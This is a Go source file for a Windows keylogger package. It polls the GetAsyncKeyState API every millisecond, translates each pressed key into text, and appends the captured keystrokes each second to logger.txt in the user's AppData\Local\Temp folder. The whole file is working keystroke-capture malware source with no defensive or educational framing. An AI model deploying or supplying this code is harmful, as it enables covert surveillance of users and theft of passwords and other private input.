package keylogger

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"syscall"
	"time"

	logger "github.com/dm1trypon/easy-logger"
)

const (
	// DefaultLogPath - default keylogger's path
	DefaultLogPath = "\\AppData\\Local\\Temp\\"
	// DefaultLogFileName - default keylogger's filename
	DefaultLogFileName = "logger.txt"
	// HandlerInterval - default keylogger's handler interval
	HandlerInterval = 1
	// WriterInterval - default keylogger's writer interval
	WriterInterval = 1000
	// CountKeys - count of keyboard keys
	CountKeys = 256
	// KeyEventCode - event's code for detection keyboard's event
	KeyEventCode = 32769
)

// connecting user32.dll
var user32 = syscall.NewLazyDLL("user32.dll")

/*
Create <Keylogger> - init Installer structure
	Returns <*Keylogger>:
		1. Structure pointer
*/
func (k *Keylogger) Create() *Keylogger {
	k = &Keylogger{
		lc:                   "KEYLOGGER",
		procGetAsyncKeyState: user32.NewProc("GetAsyncKeyState"),
		pressedKeys:          "",
		logsPath:             DefaultLogPath,
		logsFileName:         DefaultLogFileName,
		chCritError:          make(chan bool, 1),
	}

	path, err := user.Current()
	if err != nil {
		logger.CriticalJ(k.lc, fmt.Sprint("Current user path error: ", err.Error()))
		return nil
	}

	k.logsPath = fmt.Sprint(path.HomeDir, DefaultLogPath)

	return k
}

/*
SetLogsPath <Keylogger> - setting log's path
	Args:
		1. logsPath <string> - log's path
*/
func (k *Keylogger) SetLogsPath(logsPath string) {
	k.logsPath = logsPath
}

/*
SetLogsFileName <Keylogger> - setting log's filename
	Args:
		1. logsFileName <string> - log's filename
*/
func (k *Keylogger) SetLogsFileName(logsFileName string) {
	k.logsFileName = logsFileName
}

/*
GetChCritError <Keylogger> - getting error channel
	Returns <<-chan bool>:
		1. Channel error
*/
func (k *Keylogger) GetChCritError() <-chan bool {
	return k.chCritError
}

// Run <Keylogger> - starts the keylogger process
func (k *Keylogger) Run() {
	logger.InfoJ(k.lc, "Starting key's handler")
	go k.handler()
	go k.writer()
}

// writer <Keylogger> - writing the keystroke buffer to a file
func (k *Keylogger) writer() {
	for {
		time.Sleep(time.Duration(WriterInterval) * time.Millisecond)

		if len(k.pressedKeys) < 1 {
			continue
		}

		if _, err := os.Stat(k.logsPath); err != nil {
			logger.WarningJ(k.lc, fmt.Sprint("Log's file error: ", err.Error()))

			if err := os.MkdirAll(filepath.Dir(k.logsPath), 0770); err != nil {
				logger.CriticalJ(k.lc, fmt.Sprint("Can not create log's path: ", err.Error()))
				k.chCritError <- true
				return
			}
		}

		file, err := os.OpenFile(fmt.Sprint(k.logsPath, k.logsFileName), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
		if err != nil {
			logger.CriticalJ(k.lc, fmt.Sprint("Can not create log's file: ", err.Error()))
			k.chCritError <- true
			return
		}

		defer file.Close()

		if _, err = file.WriteString(k.pressedKeys); err != nil {
			logger.CriticalJ(k.lc, fmt.Sprint("Can not write logs: ", err.Error()))
			k.chCritError <- true
			return
		}

		k.pressedKeys = ""
	}
}

// handler <Keylogger> - keystroke interceptor
func (k *Keylogger) handler() {
	for {
		time.Sleep(time.Duration(HandlerInterval) * time.Millisecond)

		for key := 0; key <= CountKeys; key++ {
			value, _, _ := k.procGetAsyncKeyState.Call(uintptr(key))

			// It could have been entered into the map, but it took too long :)
			if int(value) == KeyEventCode {
				switch key {
				case VK_CONTROL:
					k.pressedKeys += "[Ctrl]"
				case VK_BACK:
					k.pressedKeys += "[Back]"
				case VK_TAB:
					k.pressedKeys += "[Tab]"
				case VK_RETURN:
					k.pressedKeys += "[Enter]\r\n"
				case VK_SHIFT:
					k.pressedKeys += "[Shift]"
				case VK_MENU:
					k.pressedKeys += "[Alt]"
				case VK_CAPITAL:
					k.pressedKeys += "[CapsLock]"
				case VK_ESCAPE:
					k.pressedKeys += "[Esc]"
				case VK_SPACE:
					k.pressedKeys += " "
				case VK_PRIOR:
					k.pressedKeys += "[PageUp]"
				case VK_NEXT:
					k.pressedKeys += "[PageDown]"
				case VK_END:
					k.pressedKeys += "[End]"
				case VK_HOME:
					k.pressedKeys += "[Home]"
				case VK_LEFT:
					k.pressedKeys += "[Left]"
				case VK_UP:
					k.pressedKeys += "[Up]"
				case VK_RIGHT:
					k.pressedKeys += "[Right]"
				case VK_DOWN:
					k.pressedKeys += "[Down]"
				case VK_SELECT:
					k.pressedKeys += "[Select]"
				case VK_PRINT:
					k.pressedKeys += "[Print]"
				case VK_EXECUTE:
					k.pressedKeys += "[Execute]"
				case VK_SNAPSHOT:
					k.pressedKeys += "[PrintScreen]"
				case VK_INSERT:
					k.pressedKeys += "[Insert]"
				case VK_DELETE:
					k.pressedKeys += "[Delete]"
				case VK_HELP:
					k.pressedKeys += "[Help]"
				case VK_LWIN:
					k.pressedKeys += "[LeftWindows]"
				case VK_RWIN:
					k.pressedKeys += "[RightWindows]"
				case VK_APPS:
					k.pressedKeys += "[Applications]"
				case VK_SLEEP:
					k.pressedKeys += "[Sleep]"
				case VK_NUMPAD0:
					k.pressedKeys += "[Pad 0]"
				case VK_NUMPAD1:
					k.pressedKeys += "[Pad 1]"
				case VK_NUMPAD2:
					k.pressedKeys += "[Pad 2]"
				case VK_NUMPAD3:
					k.pressedKeys += "[Pad 3]"
				case VK_NUMPAD4:
					k.pressedKeys += "[Pad 4]"
				case VK_NUMPAD5:
					k.pressedKeys += "[Pad 5]"
				case VK_NUMPAD6:
					k.pressedKeys += "[Pad 6]"
				case VK_NUMPAD7:
					k.pressedKeys += "[Pad 7]"
				case VK_NUMPAD8:
					k.pressedKeys += "[Pad 8]"
				case VK_NUMPAD9:
					k.pressedKeys += "[Pad 9]"
				case VK_MULTIPLY:
					k.pressedKeys += "*"
				case VK_ADD:
					k.pressedKeys += "+"
				case VK_SEPARATOR:
					k.pressedKeys += "[Separator]"
				case VK_SUBTRACT:
					k.pressedKeys += "-"
				case VK_DECIMAL:
					k.pressedKeys += "."
				case VK_DIVIDE:
					k.pressedKeys += "[Devide]"
				case VK_F1:
					k.pressedKeys += "[F1]"
				case VK_F2:
					k.pressedKeys += "[F2]"
				case VK_F3:
					k.pressedKeys += "[F3]"
				case VK_F4:
					k.pressedKeys += "[F4]"
				case VK_F5:
					k.pressedKeys += "[F5]"
				case VK_F6:
					k.pressedKeys += "[F6]"
				case VK_F7:
					k.pressedKeys += "[F7]"
				case VK_F8:
					k.pressedKeys += "[F8]"
				case VK_F9:
					k.pressedKeys += "[F9]"
				case VK_F10:
					k.pressedKeys += "[F10]"
				case VK_F11:
					k.pressedKeys += "[F11]"
				case VK_F12:
					k.pressedKeys += "[F12]"
				case VK_NUMLOCK:
					k.pressedKeys += "[NumLock]"
				case VK_SCROLL:
					k.pressedKeys += "[ScrollLock]"
				case VK_LSHIFT:
					k.pressedKeys += "[LeftShift]"
				case VK_RSHIFT:
					k.pressedKeys += "[RightShift]"
				case VK_LCONTROL:
					k.pressedKeys += "[LeftCtrl]"
				case VK_RCONTROL:
					k.pressedKeys += "[RightCtrl]"
				case VK_LMENU:
					k.pressedKeys += "[LeftMenu]"
				case VK_RMENU:
					k.pressedKeys += "[RightMenu]"
				case VK_OEM_1:
					k.pressedKeys += ";"
				case VK_OEM_2:
					k.pressedKeys += "/"
				case VK_OEM_3:
					k.pressedKeys += "`"
				case VK_OEM_4:
					k.pressedKeys += "["
				case VK_OEM_5:
					k.pressedKeys += "\\"
				case VK_OEM_6:
					k.pressedKeys += "]"
				case VK_OEM_7:
					k.pressedKeys += "'"
				case VK_OEM_PERIOD:
					k.pressedKeys += "."
				case 0x30:
					k.pressedKeys += "0"
				case 0x31:
					k.pressedKeys += "1"
				case 0x32:
					k.pressedKeys += "2"
				case 0x33:
					k.pressedKeys += "3"
				case 0x34:
					k.pressedKeys += "4"
				case 0x35:
					k.pressedKeys += "5"
				case 0x36:
					k.pressedKeys += "6"
				case 0x37:
					k.pressedKeys += "7"
				case 0x38:
					k.pressedKeys += "8"
				case 0x39:
					k.pressedKeys += "9"
				case 0x41:
					k.pressedKeys += "a"
				case 0x42:
					k.pressedKeys += "b"
				case 0x43:
					k.pressedKeys += "c"
				case 0x44:
					k.pressedKeys += "d"
				case 0x45:
					k.pressedKeys += "e"
				case 0x46:
					k.pressedKeys += "f"
				case 0x47:
					k.pressedKeys += "g"
				case 0x48:
					k.pressedKeys += "h"
				case 0x49:
					k.pressedKeys += "i"
				case 0x4A:
					k.pressedKeys += "j"
				case 0x4B:
					k.pressedKeys += "k"
				case 0x4C:
					k.pressedKeys += "l"
				case 0x4D:
					k.pressedKeys += "m"
				case 0x4E:
					k.pressedKeys += "n"
				case 0x4F:
					k.pressedKeys += "o"
				case 0x50:
					k.pressedKeys += "p"
				case 0x51:
					k.pressedKeys += "q"
				case 0x52:
					k.pressedKeys += "r"
				case 0x53:
					k.pressedKeys += "s"
				case 0x54:
					k.pressedKeys += "t"
				case 0x55:
					k.pressedKeys += "u"
				case 0x56:
					k.pressedKeys += "v"
				case 0x57:
					k.pressedKeys += "w"
				case 0x58:
					k.pressedKeys += "x"
				case 0x59:
					k.pressedKeys += "y"
				case 0x5A:
					k.pressedKeys += "z"
				}
			}
		}
	}
}
